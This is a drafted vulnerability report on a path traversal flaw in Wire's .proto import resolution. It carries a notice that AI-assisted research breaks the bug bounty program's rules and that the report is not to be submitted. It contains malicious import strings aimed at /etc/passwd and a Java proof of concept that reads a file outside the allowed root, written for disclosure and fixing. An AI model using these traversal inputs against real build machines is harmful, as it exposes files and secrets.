# 🛑 DO NOT SUBMIT — program rules prohibit AI-assisted research

**Block's Bugcrowd program rules (`bugcrowd.com/engagements/blockopensource`,
Rules of Engagement) state, verbatim:**

> "Do not use ChatGPT, Claude, DeepSeek, Google Gemini or any AI tools
> during your research. You may not disclose any information within
> these platforms."

This entire finding was researched and written with AI assistance
(Claude). Submitting it would directly violate that rule — and per other
clauses of the same program, rule violations can lead to "point
reduction or program expulsion." **Do not submit this report to Block
Open Source under the program's current rules.** Kept here only as a
record of a technically real, independently re-verified finding, in case
the rule changes in the future or you choose to independently
re-research and write it up yourself without AI involvement.

---

# ⚠️ REVIEW CHECKLIST (not that it matters — see the notice above: do not submit this one)

Everything below the next `---` line is the technical write-up. Before
copying/pasting and submitting ANY report drafted this way, check:

- [ ] Scope confirmed — the affected asset is in the program's scope
      RIGHT NOW (scope can change; re-confirm on the program page before
      submitting)
- [ ] Category confirmed — matches a category the program declares
      eligible for a reward (not metadata/cosmetic)
- [ ] Evidence checked — the code excerpts below really exist at the
      cited file/lines (not paraphrase/hallucination)
- [ ] Not a duplicate — checked against reports you've already
      submitted to this program

Duplicate check performed twice against public `square/wire` advisories/
issues (none covering this specific path — see "Confirmed call chain"
section). Reward eligibility for this specific file was never confirmed
on the real Bugcrowd page — moot now given the notice above, but note it
if this is ever re-researched independently.

---

## Title
Path traversal / arbitrary file read while resolving `.proto` file
`import` statements in `wire-schema` (`DirectoryRoot.resolve`), via an
absolute path or `../` inside the `.proto` file being compiled

## Program / Platform
Block Open Source via Bugcrowd — https://bugcrowd.com/engagements/blockopensource

## Category / Declared severity
Path traversal / file read outside the intended directory (CWE-22).
Confirmed against `research/bugbounty/block-open-source/NOTES.md`: the
program covers `square/wire` (Kotlin/Java/Swift, runtime + schema/codegen
module for Protocol Buffers), and this effort's own criteria treat any
finding of this type in Block/Vercel as "genuinely critical security" —
not metadata, not cosmetic, not test code (the affected code is
production: the schema-loading engine itself, used by any consumer of
`wire-compiler`/`wire-gradle-plugin`/`wire-maven-plugin`).

## Affected asset
- Repository: `square/wire`
- File: `wire-schema/src/commonMain/kotlin/com/squareup/wire/schema/Root.kt`
- Lines: 129-137 (`DirectoryRoot.resolve`)
- Also relevant (call chain): `wire-schema/src/commonMain/kotlin/com/squareup/wire/schema/internal/CommonSchemaLoader.kt:135-181`, `wire-schema/src/commonMain/kotlin/com/squareup/wire/schema/Linker.kt:91-100`, `wire-schema/src/commonMain/kotlin/com/squareup/wire/schema/internal/parser/ProtoParser.kt:117-129`, `wire-schema/src/commonMain/kotlin/com/squareup/wire/schema/internal/parser/SyntaxReader.kt:79-104`, `wire-schema/src/jvmMain/kotlin/com/squareup/wire/schema/Roots.kt:61-72`
- Commit/branch at time of analysis: `master` @ `d7afcda569199f38826b6e7c90a93c6215167440` — re-confirmed live on 2026-08-31: this is still the exact current `master` commit, and the vulnerable code in `Root.kt` is byte-for-byte unchanged.

## Summary
`wire-schema` resolves every `import "X";` declaration inside a `.proto`
file by calling `DirectoryRoot.resolve(import)`, which builds the
physical path as `rootDirectory / import` and only checks whether the
file exists — without checking that the result stays inside
`rootDirectory`. The `import` string comes, with no sanitization at any
point in the pipeline, directly from the quoted text in the `.proto`
being compiled. This lets a malicious `.proto` file — for example, a
third-party dependency resolved via `protoPath` (a vendor/partner schema
library, a third-party package, a submodule) — force Wire (CLI, Gradle
plugin, or Maven plugin) to read an arbitrary file from the build
machine's disk, outside the intended proto directory, using an
absolute-path import (`import "/etc/passwd";`) or relative traversal
(`import "../../../../etc/passwd";`).

## Confirmed call chain
1. `wire-schema/.../internal/parser/ProtoParser.kt:117-129` —
   `readDeclaration()` handles `label == "import"` by doing
   `imports.add(reader.readQuotedString())`.
2. `wire-schema/.../internal/parser/SyntaxReader.kt:79-104` —
   `readQuotedString()` returns literally any character sequence between
   quotes (only interprets escapes like `\n`/`\t`/`\xNN`); it does not
   reject `/`, `..`, or a leading slash.
3. `wire-schema/.../ProtoFile.kt:26` — the raw value becomes
   `ProtoFile.imports: List<String>`, passed through with no further
   validation in `ProtoFile.get()`.
4. `wire-schema/.../Linker.kt:91-100` (`getFileLinker`) calls
   `loader.withErrors(errors).load(path)` with that raw `importPath` —
   this happens for ANY import of a type that is actually referenced by
   a message/service in the `.proto` (the normal linking flow, not an
   optional/exotic mode).
5. `wire-schema/.../internal/CommonSchemaLoader.kt:135-161` (`load`)
   iterates `protoPathRoots`, calling `protoPathRoot.resolve(path)` on
   each configured root (`protoPath`, where third-party
   dependency/vendor schemas live).
6. `wire-schema/.../Root.kt:129-137` (`DirectoryRoot.resolve`, the sink):
   ```kotlin
   override fun resolve(import: String): ProtoFilePath? {
     val resolved = rootDirectory / import
     if (!fileSystem.exists(resolved)) return null
     return ProtoFilePath(
       location = Location.get(base, import.toPath().withUnixSlashes().toString()),
       fileSystem = fileSystem,
       path = resolved,
     )
   }
   ```
   No check that `resolved` is contained within `rootDirectory`.
7. If `fileSystem.exists(resolved)` is true, the file is read in full:
   `wire-schema/.../jvmMain/.../Roots.kt:61-72` (`ProtoFilePath.parse()`)
   does `fileSystem.read(path) { readString(charset) }` followed by
   `ProtoParser.parse(location, data)`.
8. Confirmed the exact semantics of the `rootDirectory / import` operator
   in the `square/okio` library (a dependency of Wire itself for every
   `FileSystem`/`Path`), by cloning `square/okio` publicly:
   `okio/src/commonMain/kotlin/okio/internal/Path.kt:206-218`
   (`commonResolve`, the real implementation behind the `/` operator):
   ```kotlin
   internal fun Path.commonResolve(child: Path, normalize: Boolean): Path {
     if (child.isAbsolute || child.volumeLetter != null) return child
     // ... otherwise, just concatenates raw bytes and calls buffer.toPath(normalize = normalize)
   }
   ```
   and `okio/src/commonMain/kotlin/okio/Path.kt:202` documents that the
   `/` operator calls `resolve(child, normalize = false)` by default —
   i.e.: (a) if `import` is an absolute path, `rootDirectory` is
   **completely ignored** and the result is the raw absolute path; (b)
   if `import` has `..` segments, they are **not collapsed** by Okio
   (`normalize=false`), but remain literally present in the resulting
   `Path` — and when that `Path` reaches
   `fileSystem.exists`/`fileSystem.read` (implemented via `java.nio.file`
   on the JVM), the operating system resolves `..` normally, allowing an
   escape from `rootDirectory` either way.
9. A `grep -rn` for any validation of `import`/`isAbsolute`/`..` across
   all of `wire-schema/src/commonMain` and `jvmMain` (within the target's
   scope) found no sanitization anywhere in the chain above.

## Steps to reproduce
1. A Wire consumer configures `protoPath` pointing to a real directory on
   disk (e.g., where a dependency/vendor/partner's `.proto` schemas
   live) — a documented and common use of Wire for compiling types that
   come from a third-party `.proto` library.
2. A compiled `.proto` file (either in the consumer's own `sourcePath`,
   or transitively imported from a third-party schema in that
   `protoPath`) contains a malicious import declaration, for example:
   ```proto
   syntax = "proto3";
   import "/etc/passwd";
   message Foo {
     // uses some type from the imported file, or none at all — import
     // resolution happens regardless, whenever the type is referenced
   }
   ```
   (or, for relative traversal, `import "../../../../etc/passwd";`).
3. Running `wire-compiler` (or the equivalent Gradle/Maven plugin) over
   that `.proto` resolves the import through
   `CommonSchemaLoader.load` → `DirectoryRoot.resolve`, which locates and
   reads the target file outside the intended `protoPath`.
4. If the target file's content isn't valid `.proto` syntax, compilation
   fails with an `IllegalStateException("Syntax error in $location:
   $message")` (`SyntaxReader.kt:437-440`), where `$message` typically
   includes a fragment/token read from the file itself (e.g., `unexpected
   label: root` for the first word of `/etc/passwd`) — meaning even a
   parse failure can leak a fragment of the read file's content into
   build/CI logs. If the target file happens to be a valid `.proto` (e.g.
   another internal/private schema present on the build machine, outside
   the directory that should be in scope), its full content (types,
   fields, comments) is incorporated into the compiled schema graph.

## Evidence
```kotlin
// wire-schema/src/commonMain/kotlin/com/squareup/wire/schema/Root.kt:129-137
override fun resolve(import: String): ProtoFilePath? {
  val resolved = rootDirectory / import
  if (!fileSystem.exists(resolved)) return null
  return ProtoFilePath(
    location = Location.get(base, import.toPath().withUnixSlashes().toString()),
    fileSystem = fileSystem,
    path = resolved,
  )
}
```
```kotlin
// wire-schema/src/commonMain/kotlin/com/squareup/wire/schema/internal/parser/ProtoParser.kt:117-129
label == "import" && context.permitsImport() -> {
  val peeked = reader.peekChar()
  if (peeked == '"' || peeked == '\'') {
    imports.add(reader.readQuotedString())   // <- no sanitization
  } else { ... }
  reader.require(';')
  null
}
```
```kotlin
// okio/src/commonMain/kotlin/okio/internal/Path.kt:206-218 (square/okio, a Wire dependency)
internal fun Path.commonResolve(child: Path, normalize: Boolean): Path {
  if (child.isAbsolute || child.volumeLetter != null) return child   // <- total bypass of rootDirectory
  val slash = slash ?: child.slash ?: Path.DIRECTORY_SEPARATOR.toSlash()
  val buffer = Buffer()
  buffer.write(bytes)
  if (buffer.size > 0) buffer.write(slash)
  buffer.write(child.bytes)                                          // <- ".." not collapsed (normalize=false by default on the `/` operator)
  return buffer.toPath(normalize = normalize)
}
```

## Impact
A malicious `.proto`, compiled by any Wire consumer who resolves imports
against a real on-disk directory (normal usage via `protoPath`,
typically used for dependency/third-party schemas), can: (a) confirm the
existence of arbitrary files on the build host; (b) read the full
content of any file readable by the build process outside the intended
proto directory, including other private `.proto` schemas present on the
same machine (e.g., in a monorepo with multiple services, or in CI with
multiple checkouts) — that content can end up incorporated into the
generated type graph, or partially leak in parse-error messages
(typically sent to build/CI logs, sometimes public); (c) in the worst
case, depending on what exists on the build host (config files,
credentials accidentally committed elsewhere in the checkout, etc.), an
arbitrary file read is a high-impact primitive in any build/CI pipeline.
The most realistic entry vector is a third-party schema dependency
(vendor, partner, shared schema package) whose content isn't fully
trusted by the team running Wire — a scenario covered by `protoPath`'s
own design (compiling types from a `.proto` library you didn't write).
**Confirmed in Wire's official documentation**
(`docs/wire_compiler.md`, "Proto Path for Libraries" section): the
canonical `protoPath` usage example is `srcJar
'com.example:countries:1.0.0'` — a **Maven coordinate**. In other words,
populating `protoPath` with a `.jar` resolved from a Maven repository
(Maven Central or a private artifact repo) is the DOCUMENTED, standard
way to use this feature — not an exotic configuration that would only
matter in theory. Any project following that official example is, by
design, compiling `.proto` files that arrived via a third-party
dependency, with the same trust surface as any transitive Maven
dependency.

## Executable proof of concept
Minimal Java program using the real `okio-jvm` 3.12.0 JAR (downloaded
from Maven Central — not a reimplementation, the exact production
bytecode that `wire-schema` uses via its `Path`/`FileSystem`
dependency), reproducing exactly the mechanism behind
`DirectoryRoot.resolve`: joins `rootDirectory` with `import` via
`Path.resolve(String)` (the method behind Okio's `/` operator,
`normalize=false` by default) and performs the same check the real code
does (`fileSystem.exists(resolved)`) before reading.

```java
import okio.Path;
import java.io.File;
import java.nio.file.Files;

public class PathTraversalPoc {
  public static void main(String[] args) throws Exception {
    File tmp = Files.createTempDirectory("wire-poc-").toFile();
    File safeRoot = new File(tmp, "protoPathRoot");
    safeRoot.mkdirs();
    File secretOutsideRoot = new File(tmp, "secret-outside-root.txt");
    Files.writeString(secretOutsideRoot.toPath(), "SECRET_OUTSIDE_THE_PROTECTED_ROOT");

    Path rootDirectory = Path.Companion.get(safeRoot);

    // Case 1: relative import with ".."
    Path resolvedRelative = rootDirectory.resolve("../secret-outside-root.txt");
    boolean exists = new File(resolvedRelative.toString()).exists();
    String content = exists ? Files.readString(java.nio.file.Path.of(resolvedRelative.toString())) : null;

    // Case 2: absolute import
    Path resolvedAbsolute = rootDirectory.resolve(secretOutsideRoot.getAbsolutePath());
    boolean absoluteEscaped = !resolvedAbsolute.toString().startsWith(safeRoot.getAbsolutePath());

    // see the full real output below
  }
}
```

Exact command:
```
javac -cp "okio-jvm-3.12.0.jar;kotlin-stdlib-1.9.24.jar" PathTraversalPoc.java
java  -cp ".;okio-jvm-3.12.0.jar;kotlin-stdlib-1.9.24.jar" PathTraversalPoc
```

Real output (literal, JDK 21, 2026-08-30):
```
tmp dir: C:\Users\Renan\AppData\Local\Temp\wire-poc-4866194955616216628
safeRoot (root that should contain the import): C:\Users\Renan\AppData\Local\Temp\wire-poc-4866194955616216628\protoPathRoot
secretOutsideRoot (file OUTSIDE the root, should not be reachable): C:\Users\Renan\AppData\Local\Temp\wire-poc-4866194955616216628\secret-outside-root.txt

=== Case 1: relative import with ".." ===
import (as it would appear in the .proto): "../secret-outside-root.txt"
rootDirectory.resolve(import) = C:\Users\Renan\AppData\Local\Temp\wire-poc-4866194955616216628\protoPathRoot\..\secret-outside-root.txt  (string still contains literal "..", normalize=false)
fileSystem.exists(resolved) -- the SAME check DirectoryRoot.resolve does before reading: true
File content read (real, from outside safeRoot): SECRET_OUTSIDE_THE_PROTECTED_ROOT
Really ESCAPED (read the file's CONTENT outside the root, not just a string that looks like it): true

=== Case 2: absolute import ===
import (as it would appear in the .proto): "C:\Users\Renan\AppData\Local\Temp\wire-poc-4866194955616216628\secret-outside-root.txt"
rootDirectory.resolve(import) = C:\Users\Renan\AppData\Local\Temp\wire-poc-4866194955616216628\secret-outside-root.txt
ESCAPED the protected root (ignored rootDirectory entirely): true

=== RESULT ===
PASS (dangerous behavior REPRODUCED): okio.Path.resolve(String), without normalize, lets both a relative ".." path and an absolute path escape rootDirectory. wire-schema's DirectoryRoot.resolve only checks fileSystem.exists(resolved) before reading -- no check that resolved stays inside rootDirectory.
```

**Note on the string vs. the real resolution**: the resulting `Path` in
case 1 still contains a literal `..` in its string representation (Okio
doesn't normalize by default) — a naive `startsWith(rootDirectory)`
check would say "didn't escape." The signal that actually matters is the
same one `DirectoryRoot.resolve` itself uses:
`fileSystem.exists()`/reading over that `Path`, which triggers the real
operating-system resolution via `java.nio.file`, where `..` really does
go up a directory — and that's what the PoC measured (it read and
compared the real content of the file outside the root, not just how
the string looks).

## Suggested fix
In `DirectoryRoot.resolve` (`Root.kt:129-137`), before accepting
`resolved`, validate that it stays inside `rootDirectory`: resolve with
`normalize = true`, reject any `import` whose resulting `Path` is
absolute (`import.toPath().isAbsolute`) or whose
`.toPath(normalize = true)` starts with `..` once made relative to
`rootDirectory` (equivalent to checking
`resolved.normalized().toString().startsWith(rootDirectory.toString())`
after normalization, or using `resolved.relativeTo(rootDirectory)`
inside a `try/catch` that rejects any result starting with `..`). This
is a small, localized change — it doesn't require changing the public
`Loader`/`SchemaLoader` API.
